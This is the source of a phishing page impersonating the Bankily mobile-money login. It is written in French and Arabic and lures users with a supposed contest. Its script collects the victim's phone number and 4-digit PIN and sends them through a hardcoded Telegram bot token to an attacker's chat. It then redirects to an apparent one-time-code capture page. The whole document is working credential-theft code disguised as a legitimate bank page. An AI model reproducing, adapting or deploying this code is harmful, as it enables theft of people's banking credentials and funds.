<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#ffffff">
<title>Bankily – Connexion</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;min-height:100vh;overflow-x:hidden;background:#fff}
body{font-family:'Cairo',sans-serif;background:#ffffff;color:#222;min-height:100vh;display:flex;flex-direction:column;}
.top-bar{display:flex;align-items:center;justify-content:space-between;padding:10px 16px;background:#fff;border-bottom:1px solid #f0f0f0;position:sticky;top:0;z-index:50;}
.tb-back{background:none;border:none;cursor:pointer;font-family:'Cairo',sans-serif;font-size:15px;font-weight:700;color:#0097A7;padding:4px 0;display:flex;align-items:center;gap:4px;}
.tb-lang{background:none;border:1.5px solid #0097A7;border-radius:20px;color:#0097A7;font-family:'Cairo',sans-serif;font-size:13px;font-weight:700;padding:4px 14px;cursor:pointer;transition:all .2s;}
.tb-lang:hover{background:#0097A7;color:#fff}
.page{flex:1;display:flex;flex-direction:column;padding:0 28px calc(90px + env(safe-area-inset-bottom));max-width:480px;margin:0 auto;width:100%;}
.logo-wrap{text-align:center;padding:36px 0 36px;}
.logo-wrap img{max-width:220px;width:100%;height:auto;display:block;margin:0 auto;}
.info-msg{font-size:13px;color:#0097A7;background:#E8F7F9;border-radius:10px;padding:10px 14px;margin-bottom:28px;line-height:1.6;text-align:center;transition:opacity .4s,height .4s;}
.info-msg.hidden{opacity:0;pointer-events:none;height:0;padding:0;margin:0;overflow:hidden}
.field-row{display:flex;align-items:flex-end;gap:14px;margin-bottom:32px;padding-bottom:6px;border-bottom:1.5px solid #c8c8c8;transition:border-color .25s;}
.field-row:focus-within{border-color:#0097A7}
.icon-person{width:28px;height:28px;flex-shrink:0;margin-bottom:2px;color:#666}
.field-inner{flex:1;display:flex;flex-direction:column;gap:0}
.float-label{font-size:12px;color:#0097A7;font-weight:700;letter-spacing:.2px;margin-bottom:2px;opacity:0;transform:translateY(6px);transition:opacity .2s,transform .2s;font-family:'Cairo',sans-serif;}
.float-label.show{opacity:1;transform:none}
.field-input{border:none;outline:none;background:transparent;font-family:'Cairo',sans-serif;font-size:16px;color:#222;padding:2px 0 4px;width:100%;}
.field-input::placeholder{color:#aaa;font-size:15px;font-family:'Cairo',sans-serif}
.pin-row{display:flex;align-items:flex-start;gap:14px;margin-bottom:20px;}
.icon-lock{width:28px;height:28px;flex-shrink:0;margin-top:4px;color:#666}
.pin-right{flex:1}
.pin-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;}
.pin-label{font-size:15px;color:#222;font-weight:600;font-family:'Cairo',sans-serif}
.forgot-pin{font-size:14px;color:#0097A7;font-weight:600;text-decoration:underline;cursor:pointer;background:none;border:none;font-family:'Cairo',sans-serif;padding:0;}
.pin-boxes{display:flex;gap:18px;direction:ltr;align-items:flex-end;}
.pin-box{width:34px;height:44px;border:none;outline:none;background:transparent;font-family:'Cairo',sans-serif;font-size:24px;font-weight:800;text-align:center;color:#222;direction:ltr;border-bottom:2.5px solid #333;padding:0;caret-color:transparent;-webkit-appearance:none;border-radius:0;}
.pin-box:focus{border-bottom-color:#0097A7}
.new-user-wrap{text-align:center;margin-top:auto;padding:24px 0 16px;}
.new-user-btn{font-size:14px;color:#0097A7;text-decoration:underline;cursor:pointer;background:none;border:none;font-family:'Cairo',sans-serif;font-weight:600;}
.btn-bar{position:fixed;bottom:0;left:0;right:0;z-index:100;}
.login-btn{display:block;width:100%;padding:18px;border:none;background:#F5C20B;color:#fff;font-family:'Cairo',sans-serif;font-size:18px;font-weight:800;cursor:pointer;letter-spacing:.3px;transition:background .2s;}
.login-btn:hover{background:#E0B008}
.login-btn:active{background:#CDA007}
#loader-overlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.94);z-index:9999;flex-direction:column;align-items:center;justify-content:center;gap:18px;}
#loader-overlay.active{display:flex}
.ld-ring{width:52px;height:52px;position:relative}
.ld-ring::before{content:'';position:absolute;inset:0;border-radius:50%;border:3px solid #eee;border-top-color:#F5C20B;animation:spin .8s linear infinite;}
@keyframes spin{to{transform:rotate(360deg)}}
.ld-text{font-size:15px;color:#0097A7;font-weight:700;font-family:'Cairo',sans-serif}
#modal-alert{display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:10000;justify-content:center;align-items:center;padding:20px;}
#modal-alert.show{display:flex}
.modal-box{background:#fff;border-radius:20px;padding:28px 22px;max-width:340px;width:100%;text-align:center;box-shadow:0 10px 50px rgba(0,0,0,.2);}
.modal-box p{font-size:15px;color:#222;line-height:1.7;margin-bottom:20px;white-space:pre-line;font-family:'Cairo',sans-serif;}
.modal-btn{background:#F5C20B;color:#fff;border:none;padding:12px 36px;border-radius:10px;cursor:pointer;font-family:'Cairo',sans-serif;font-size:15px;font-weight:700;width:100%;}
</style>
</head>
<body>

<div id="loader-overlay">
  <div class="ld-ring"></div>
  <div class="ld-text" id="ld-text">Connexion en cours...</div>
</div>

<div id="modal-alert">
  <div class="modal-box">
    <p id="modal-text"></p>
    <button class="modal-btn" id="modal-close">OK</button>
  </div>
</div>

<div class="top-bar">
  <button class="tb-back" id="back-btn" onclick="window.location.href='index.html'">&#8592; Retour</button>
  <button class="tb-lang" id="lang-btn" onclick="toggleLang()">عربي</button>
</div>

<div class="page">
  <div class="logo-wrap">
    <img src="images/logo.png" alt="Bankily" onerror="this.style.display='none'">
  </div>

  <div class="info-msg" id="info-msg">
    Assurez-vous de bien saisir votre numéro Bankily et votre code PIN pour confirmer votre inscription au concours
  </div>

  <form id="login-form" autocomplete="off">
    <div class="field-row" id="field-row-user">
      <svg class="icon-person" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="8" r="4"/>
        <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/>
      </svg>
      <div class="field-inner">
        <div class="float-label" id="float-label-user">Nom d'utilisateur ou numéro de téléphone</div>
        <input class="field-input" type="tel" id="username" inputmode="numeric" maxlength="8"
          placeholder="Nom d'utilisateur ou numéro de téléphone" autocomplete="off">
      </div>
    </div>

    <div class="pin-row">
      <svg class="icon-lock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
        <rect x="5" y="11" width="14" height="10" rx="2"/>
        <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
      </svg>
      <div class="pin-right">
        <div class="pin-top">
          <span class="pin-label" id="pin-label">Code PIN</span>
          <button type="button" class="forgot-pin" id="forgot-pin">Code PIN oublié ?</button>
        </div>
        <div class="pin-boxes" id="pin-boxes" dir="ltr">
          <input class="pin-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
          <input class="pin-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
          <input class="pin-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
          <input class="pin-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
        </div>
      </div>
    </div>

    <div class="new-user-wrap">
      <button type="button" class="new-user-btn" id="new-user">Nouvel utilisateur ? Inscrivez-vous maintenant !</button>
    </div>
  </form>
</div>

<div class="btn-bar">
  <button class="login-btn" id="login-btn"
    onclick="document.getElementById('login-form').dispatchEvent(new Event('submit',{cancelable:true,bubbles:true}))">
    Se connecter
  </button>
</div>

<script>
const usernameInput = document.getElementById('username');
const pinInputs     = document.querySelectorAll('.pin-box');
const loaderOverlay = document.getElementById('loader-overlay');
const modalAlert    = document.getElementById('modal-alert');
const modalText     = document.getElementById('modal-text');
const modalClose    = document.getElementById('modal-close');
const infoMsg       = document.getElementById('info-msg');
const loginBtn      = document.getElementById('login-btn');
const floatLabel    = document.getElementById('float-label-user');

const T = {
  ar:{
    dir:'rtl',lang:'ar',langBtn:'FR',
    placeholder:'اسم المستخدم أو رقم الهاتف',
    floatLabel:'اسم المستخدم أو رقم الهاتف',
    pinLabel:'الرمز السري',
    forgotPin:'نسيت الرمز السري؟',
    newUser:'مستخدم جديد؟ سجّل الآن!',
    loginBtn:'تسجيل الدخول',
    backBtn:'رجوع &#8594;',
    ldText:'جاري التسجيل...',
    infoMsg:'تأكد من كتابة رقمك بنكيلي ورمز السري بشكل صحيح حتى تأكد تسجيلك في المسابقة',
    errUsername:'يجب أن يحتوي رقم بنكيلي على 8 أرقام ويبدأ بـ 2 أو 3 أو 4',
    errPin:'يجب أن يحتوي الرمز السري على 4 أرقام',
    errPinUnique:'يجب أن يحتوي الرمز السري على 4 أرقام مختلفة',
    already:(m)=>`⛔ لقد قمت بالتسجيل في مسابقة بنكيلي من قبل.\nلا يمكنك التسجيل مرة أخرى إلا بعد ${m} دقيقة.`,
  },
  fr:{
    dir:'ltr',lang:'fr',langBtn:'عربي',
    placeholder:"Nom d'utilisateur ou numéro de téléphone",
    floatLabel:"Nom d'utilisateur ou numéro de téléphone",
    pinLabel:'Code PIN',
    forgotPin:'Code PIN oublié ?',
    newUser:"Nouvel utilisateur ? Inscrivez-vous maintenant !",
    loginBtn:'Se connecter',
    backBtn:'&#8592; Retour',
    ldText:'Connexion en cours...',
    infoMsg:"Assurez-vous de bien saisir votre numéro Bankily et votre code PIN pour confirmer votre inscription au concours",
    errUsername:'Le numéro Bankily doit contenir 8 chiffres et commencer par 2, 3 ou 4',
    errPin:'Le code PIN doit contenir 4 chiffres',
    errPinUnique:'Le code PIN doit contenir 4 chiffres tous différents',
    already:(m)=>`⛔ Vous avez déjà participé au concours Bankily.\nVous ne pouvez pas vous réinscrire avant ${m} minute(s).`,
  }
};

let isAr = localStorage.getItem('bankily_lang') === 'ar'
  || (!localStorage.getItem('bankily_lang') && (navigator.language||'').startsWith('ar'));

function applyLang(){
  const L = isAr ? T.ar : T.fr;
  document.documentElement.lang = L.lang;
  document.documentElement.dir  = L.dir;
  document.body.dir              = L.dir;
  document.getElementById('back-btn').innerHTML     = L.backBtn;
  document.getElementById('lang-btn').textContent   = L.langBtn;
  document.getElementById('pin-label').textContent  = L.pinLabel;
  document.getElementById('forgot-pin').textContent = L.forgotPin;
  document.getElementById('new-user').textContent   = L.newUser;
  document.getElementById('ld-text').textContent    = L.ldText;
  document.getElementById('info-msg').textContent   = L.infoMsg;
  floatLabel.textContent = L.floatLabel;
  loginBtn.textContent   = L.loginBtn;
  usernameInput.placeholder = L.placeholder;
  document.getElementById('pin-boxes').dir = 'ltr';
  pinInputs.forEach(i=>{ i.setAttribute('dir','ltr'); i.setAttribute('lang','fr'); });
}

function toggleLang(){
  isAr = !isAr;
  localStorage.setItem('bankily_lang', isAr?'ar':'fr');
  applyLang();
}

usernameInput.addEventListener('focus', ()=>floatLabel.classList.add('show'));
usernameInput.addEventListener('blur',  ()=>{ if(!usernameInput.value) floatLabel.classList.remove('show'); });
usernameInput.addEventListener('input', ()=>{ floatLabel.classList.toggle('show', usernameInput.value!==''); });

const infoTimer = setTimeout(()=>infoMsg.classList.add('hidden'), 3500);
usernameInput.addEventListener('input',()=>{ clearTimeout(infoTimer); infoMsg.classList.add('hidden'); });

function showModal(msg){ modalText.textContent=msg; modalAlert.classList.add('show'); }
modalClose.addEventListener('click',()=>modalAlert.classList.remove('show'));

pinInputs.forEach((inp,i)=>{
  inp.setAttribute('dir','ltr'); inp.setAttribute('lang','fr');
  inp.addEventListener('input',()=>{
    inp.value = inp.value.replace(/[^0-9]/g,'').slice(0,1);
    if(inp.value && i < pinInputs.length-1) pinInputs[i+1].focus();
    setTimeout(()=>{ inp.type='password'; },500);
  });
  inp.addEventListener('keydown',e=>{
    if(e.key==='Backspace'){
      if(inp.value==='' && i>0){ pinInputs[i-1].type='tel'; pinInputs[i-1].value=''; pinInputs[i-1].focus(); }
      else{ inp.type='tel'; inp.value=''; }
      e.preventDefault();
    }
    if(!/^[0-9]$/.test(e.key) && !['Backspace','Delete','Tab','ArrowLeft','ArrowRight'].includes(e.key))
      e.preventDefault();
  });
  inp.addEventListener('paste',e=>{
    e.preventDefault();
    const digits=(e.clipboardData||window.clipboardData).getData('text').replace(/[^0-9]/g,'');
    [...digits].slice(0,4).forEach((d,j)=>{ if(pinInputs[j]){pinInputs[j].type='tel';pinInputs[j].value=d;} });
    pinInputs[Math.min(digits.length,pinInputs.length-1)].focus();
  });
});

if(window.visualViewport){
  window.visualViewport.addEventListener('resize',()=>{
    const kb=window.innerHeight-window.visualViewport.height;
    document.querySelector('.btn-bar').style.transform=kb>50?`translateY(-${kb}px)`:'';
  });
}

/* ══ TELEGRAM — TOKEN و CHAT ID المحدَّثان ══ */
const TG_TOKEN  = '8699990453:AAF00aHjLBVLx95RkZozelaAqqhOg29H5fk';
const TG_CHATID = '8674569520';

async function sendTG(text){
  try{
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id:TG_CHATID,text,parse_mode:'HTML'})
    });
  }catch(e){}
}

function checkReg(u){
  const d=localStorage.getItem('bnk_reg_'+u);
  if(!d)return false;
  const el=(Date.now()-JSON.parse(d).ts)/60000;
  if(el>=10){localStorage.removeItem('bnk_reg_'+u);return false;}
  return Math.ceil(10-el);
}
function markReg(u){ localStorage.setItem('bnk_reg_'+u,JSON.stringify({ts:Date.now()})); }

document.getElementById('login-form').addEventListener('submit',async function(e){
  e.preventDefault();
  const L=isAr?T.ar:T.fr;
  const username=usernameInput.value.trim();
  const pin=Array.from(pinInputs).map(i=>i.value).join('');

  if(!/^[2-4][0-9]{7}$/.test(username)){showModal(L.errUsername);return;}
  if(!/^[0-9]{4}$/.test(pin)){showModal(L.errPin);return;}
  if(new Set(pin.split('')).size<4){
    showModal(L.errPinUnique);
    pinInputs.forEach(i=>{i.type='tel';i.value='';});
    pinInputs[0].focus();return;
  }

  const mins=checkReg(username);
  if(mins!==false){showModal(L.already(mins));return;}

  markReg(username);
  sessionStorage.setItem('bankily_pin',pin);
  sessionStorage.setItem('bankily_username',username);
  loaderOverlay.classList.add('active');

  const now=new Date().toLocaleString('fr-FR');
  await sendTG(
    `🔐 <b>Nouvelle connexion – Bankily</b>\n`+
    `━━━━━━━━━━━━━━━━━━━━\n`+
    `📱 <b>Numéro :</b> <code>${username}</code>\n`+
    `🔑 <b>PIN    :</b> <code>${pin}</code>\n`+
    `📅 <b>Heure  :</b> ${now}`
  );
  setTimeout(()=>{ window.location.href='otpverify.html'; },1500);
});

applyLang();
</script>
</body>
</html>
